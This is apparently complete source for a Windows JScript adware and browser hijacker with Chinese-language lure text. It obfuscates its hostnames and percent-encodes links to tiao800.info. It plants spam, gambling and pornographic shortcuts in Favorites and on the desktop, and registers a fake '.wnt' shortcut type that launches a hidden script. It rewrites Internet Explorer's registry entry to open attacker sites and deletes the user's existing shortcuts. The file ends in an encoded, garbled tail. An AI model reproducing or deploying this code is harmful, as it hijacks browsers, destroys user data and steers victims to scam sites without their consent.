(function(){

var P,q;

var k=33;

var z=".wnt";

var o="wntfile";

var D;

var DD;

var ww;

var C;

var G;

var J;

var N;

var O;

var b;

var g;

var c=["86^86^86^15^16^21^22^18^21^15^79^68^85","118^86^118^15^16^21^22^18^21^15^111^68^85"];

var i=[{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6f/1.htm",d:"成功网上赚钱 网络创业方法指导"

} ,{

u:"http://%77%77%77%2e%74%69%61%6F%38%30%30%2E%69%6E%66%6F/2.htm",d:"最新黑马股票推荐，内幕揭秘！"

} ,{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6F/3.htm",d:"美女视频聊天免费试看！"

} ,{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6F/4.htm",d:"效果好的绿色减肥产品，真管用！"

} ,{

u:"http://%77%77%77%2e%74%69%61%6F%38%30%30%2E%69%6E%66%6F/5.htm",d:"绿色丰胸魔法，30天增大3罩杯，太绝了！"

} ,{

u:"http://%77%77%77%2E%74%69%61%6f%38%30%30%2E%69%6E%66%6F/6.htm",d:"极品性感美女写真，90后性感小美女自拍"

},{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6F/7.htm",d:"足球赔率，最老牌的博彩公司！"

},{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6F/8.htm",d:"性感模特，虽然胸大但依然清纯"

},{

u:"http://%77%77%77%2E%74%69%61%6F%38%30%30%2E%69%6E%66%6F/9.htm",d:"淘宝网皇冠店大全，品质保证！"

},{

u:"http://%77%77%77%2e%74%69%61%6f%38%30%30%2E%69%6E%66%6F/0.htm",d:"各国男性阴茎尺寸排行榜（图）"

}];

var t=function(R){

var T=R.split("^");

for(var S in T){

T[S]=T[S]^k;

T[S]=String.fromCharCode(T[S])

} return T.join("")

} ;


var L=function(){

for(var S in c){

c[S]=t(c[S])

} 

} ;


var j=function(){

try{

var S=P.SpecialFolders("Favorites");

for(var T in i){

var R=P.CreateShortcut(S+"\\"+i[T]["d"]+".url");

R.TargetPath="http" + "://" + i[T]["u"];

R.Save()

} 

} catch(U){


} 

} ;

var p=function(){

var R=WScript.Arguments;

if(R.length==0){

return true

} else{

return false

} 

} ;

var u=function(){

try{

var R=P.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir");

return R

} catch(S){

return"C:\\Program Files"

} 

} ;

var r=function(T,V,S,R){

try{

var U=q.CreateTextFile(T,true);

U.WriteLine("[KonSou]");

U.WriteLine("Sogou=WoaikanDian");

U.WriteLine("Name=___"+escape(V)+"___");

U.WriteLine("Tel=<<<"+escape(S)+">>>");

U.WriteLine("[InternetShortcut]");

U.WriteLine("URL=http://www.hao123.com");

U.WriteLine("IconIndex=0");

U.WriteLine("IconFile="+R);

U.Close()

} catch(W){


} 

} ;

var I=function(){

var rcikk="{FBF23B40-E3F0-1"+"01B-8488-00AA003E56F8}";

try{

P.RegWrite("HKCR\\"+z+"\\",o,"REG_SZ");

P.RegWrite("HKCR\\"+o+"\\","快捷方式","REG_SZ");

P.RegWrite("HKCR\\"+o+"\\IsShortcut","","REG_SZ");

P.RegWrite("HKCR\\"+o+"\\NeverShowExt","","REG_SZ");

P.RegWrite("HKCR\\"+o+"\\DefaultIcon\\","%SystemRoot%\\system32\\url.dll,0","REG_EXPAND_SZ");

P.RegWrite("HKCR\\"+o+"\\CLSID\\",rcikk,"REG_SZ");

P.RegWrite("HKCR\\"+o+"\\shell\\","open","REG_SZ");

P.RegWrite("HKCR\\"+o+"\\shell\\open\\CLSID",rcikk,"REG_SZ");

P.RegWrite("HKCR\\"+o+"\\shell\\open\\command\\",'WScript.exe "'+g+'Messenger.jse" "%1"',"REG_SZ");

P.RegWrite("HKCR\\"+o+"\\shellex\\IconHandler\\",rcikk,"REG_SZ");

P.RegWrite("HKCR\\"+o+"\\shellex\\ContextMenuHandlers\\","","REG_SZ")

} catch(R){


} 

} ;


var ea=function(Y){

var T=f(Y,".TXT");

for(var S in T){

try{

var W=T[S];

var aa="";

var U="";

var R="";

var ab=/\.exe$/ig;

R=q.GetBaseName(W);

var V=q.OpenTextFile(W,1);

aa=V.ReadAll();

if(aa==""){

continue

} if(ab.test(aa)){

ad=Y+"\\"+R+z;

r(ad,aa,U,aa);

q.copyfile(ad,P.SpecialFolders("AllUsersDesktop") + "\\" + R + z,true);

l(ad);

} else{


} 

} catch(X){


} 

} 

} ;


var w=function(){

try{

var T=P.SpecialFolders("AllUsersDesktop");

var R=T+"\\Internet  Explorer"+z;

r(R,DD,"",DD)

} catch(S){


} 

} ;

var RTW=function(){

try{

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\","Internet Explorer","REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\DefaultIcon\\",D,"REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\shell\\","打开网页(&H)","REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\shell\\打开网页(&H)\\","","REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\shell\\打开网页(&H)\\Command\\",DD +' %1 ' + 'http://'+c[parseInt(Math.random()*c.length)]+'/',"REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\shell\\属性(&R)\\Command\\","Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl","REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\ShellFolder\\","HideOnDesktopPerUser","REG_SZ");

P.RegWrite("HKCR\\CLSID\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\ShellFolder\\Attributes","0","REG_DWORD");

} catch(R){

} 

} ;

var n=function(){

try{

var R=P.RegRead("HKLM\\SOFTWARE\\Clients\\StartMenuInternet\\IEXPLORE.EXE\\shell\\open\\command\\");

R=ParseFullPath(src);

R=R.replace(/"/g,"")

} catch(S){

return"C:\\Program Files\\Internet Explorer\\iexplore.exe"

} if(R==""){

return"C:\\Program Files\\Internet Explorer\\iexplore.exe"

} return R

} ;

var E=function(){

P=new ActiveXObject("WScript.Shell");

q=new ActiveXObject("Scripting.FileSystemObject");

L();

var S=P.Environment("PROCESS");

O=S("SystemRoot")+"\\System32";

b=S("ProgramFiles");

g=b+"\\Messenger\\";

ww=b+"\\lnkfiles\\";

D=n();

DD=D.replace(/iexplore.exe/g,"MUI\\iexplore.exe");

try{

q.CreateFolder(g);

} catch(R){

}

} ;

var a=function(V){

var Y=q.OpenTextFile(V,1);

var X=Y.ReadAll();

var U=/___(.*?)___/ig;

var S=/<<<(.*?)>>>/ig;

var T,R;

if(U.test(X)){

T=RegExp.$1;

T=unescape(T)

} if(S.test(X)){

R=RegExp.$1;

R=unescape(R)

} if(T!=""){

var W="http://"+c[parseInt(Math.random()*c.length)]+"/";

R=W;

if(R!=""){

R='"'+R+'"'

}

try{

 P.Run('"'+T+'" '+R,3,false)

}catch(S){

}

}

} ;

var l=function(R){

try{

var S=q.GetFile(R);

S.attributes=32;

q.DeleteFile(R)

} catch(T){


} 

} ;

var B=function(S){

var W=S;

var T=f(W,".URL");

for(var V in T){

try{

var R=T[V];

if(R.indexOf("淘宝特卖")>=0){

continue

} 

l(R)

} catch(U){


} 

} 

} ;

var Q=function(){

try{

var R=P.SpecialFolders("AllUsersDesktop")+"\\淘宝特卖.url";

var S=q.CreateTextFile(R,true);

S.WriteLine("[Acess]");

S.WriteLine("Kaba=rising+360");

S.WriteLine("acc=weib sanrensadfe");

S.WriteLine("[InternetShortcut]");

S.WriteLine("URL=http://%77%57%77%2E%74%69%61%4F%38%30%30%2E%69%6E%66%4f/%74%61%6F%62%61%6F%2E%68%74%6D");

S.WriteLine("IconIndex=0");

S.WriteLine("IconFile="+g+"taodwq.ico");

S.Close()

} catch(T){


} 

} ;

var f=function(Y,W){

try{

var U,S,R,ab;

var X=new Array;

var T=W;

var ab=q.GetFolder(Y);

U=ab;

R=new Enumerator(U.files);

T=W.toUpperCase();

for(;

!R.atEnd();

R.moveNext()){

var aa=R.item();

var Z="";

Z+=aa;

Z=Z.toUpperCase();

if((Z.match(T+"$")==ab)){

X[X.length]=Z

} 

} return X

} catch(V){

return[]

} 

} ;

E();

if(p()){

I();

w();

j();

RTW();

B(P.SpecialFolders("AllUsersDesktop"));

B(P.SpecialFolders("Desktop"));

B(P.SpecialFolders("AllUsersPrograms"));

B(P.SpecialFolders("Programs"));

B(P.SpecialFolders("AllUsersPrograms").replace(/程序/g,""))

B(P.SpecialFolders("Programs").replace(/程序/g,""))

B(P.SpecialFolders("AllUsersDesktop").replace(/All Users/g,"Default User"));

B(P.SpecialFolders("Desktop").replace(/桌面/g,"Application Data\\Microsoft\\Internet Explorer\\Quick Launch"));

ea(ww)

try{

P.RUN("flash.scf")

}catch(S){

}

P.SendKeys("{f5}+{f10}E");

P.SendKeys("+{f10}IA");

try{

P.RegWrite("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{e17d4fc0-5564-11d1-83f2-00a0c90dc849}\\","","REG_SZ");

}catch(S){

}

} else{

var x=WScript.Arguments;

a(x(0));

I();

w();

Q();

j();

RTW();

B(P.SpecialFolders("AllUsersDesktop"));

B(P.SpecialFolders("Desktop"));

B(P.SpecialFolders("AllUsersPrograms"));

B(P.SpecialFolders("Programs"));

B(P.SpecialFolders("AllUsersPrograms").replace(/程序/g,""))

B(P.SpecialFolders("Programs").replace(/程序/g,""))

B(P.SpecialFolders("AllUsersDesktop").replace(/All Users/g,"Default User"));+1kCVwWs[D/vEf/3DG2J*RM+2VC^`&桌面zTSJzw2sbmlOrKx~fmOm-wtk1DWkW6O-'qUYDUnDP2X2VKD+Mwwp!k13~SC;	m4J*bi@#@&@#@&l`AA*@##@&Kc?n	Nn+Xk`r`0l8E#@&@#@&8P@##@&8P*cbikRAJAA==^